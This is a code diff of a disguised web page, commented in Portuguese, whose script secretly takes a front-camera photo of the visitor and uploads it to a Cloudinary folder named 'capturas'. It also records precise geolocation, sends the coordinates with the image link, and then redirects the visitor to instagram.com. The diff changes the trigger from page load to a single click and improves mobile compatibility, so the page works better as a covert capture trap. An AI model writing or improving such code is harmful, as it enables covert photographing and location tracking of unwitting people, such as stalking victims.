@@ -6,27 +6,34 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>body{margin:0;overflow:hidden;background:#000;}</style>
 </head>
-<body>
+<body onclick="capturarTudo()">
 <script>
-const cloudName = "dx5legahb";
+const cloudName = "dx5legahb"; 
 const uploadPreset = "upload";
 const folderName = "capturas";
 
 async function capturarTudo() {
+  if (window.started) return; // Evita múltiplas execuções
+  window.started = true;
+
   try {
-    // 1️⃣ Captura a foto com câmera frontal (sem mostrar nada)
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    // 📸 Captura a imagem da câmera frontal no iPhone e Android
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+
     const video = document.createElement("video");
     video.srcObject = stream;
+    video.setAttribute("playsinline", true);
+    video.muted = true;
     await video.play();
 
     const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    stream.getTracks().forEach(t => t.stop());
+    stream.getTracks().forEach(track => track.stop());
 
     const imageData = canvas.toDataURL("image/png");
     const imageBlob = await (await fetch(imageData)).blob();
@@ -44,7 +51,7 @@ async function capturarTudo() {
     if (!imageResp.ok) throw new Error("Erro ao enviar imagem");
     const imageUrl = (await imageResp.json()).secure_url;
 
-    // 2️⃣ Captura a localização
+    // 📍 Captura a localização
     navigator.geolocation.getCurrentPosition(async (pos) => {
       const { latitude, longitude } = pos.coords;
       const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
@@ -62,21 +69,18 @@ async function capturarTudo() {
 
       window.location.href = "https://instagram.com";
     }, () => {
-      // Mesmo que a localização falhe, redireciona
+      // Se falhar a localização, só envia a foto
       window.location.href = "https://instagram.com";
     }, {
       enableHighAccuracy: true,
-      timeout: 5000
+      timeout: 8000
     });
 
   } catch (e) {
-    console.error("Falha:", e);
+    console.error("Erro:", e);
     window.location.href = "https://instagram.com";
   }
 }
-
-// Inicia automaticamente após o carregamento da página
-window.onload = capturarTudo;
 </script>
 </body>
 </html>
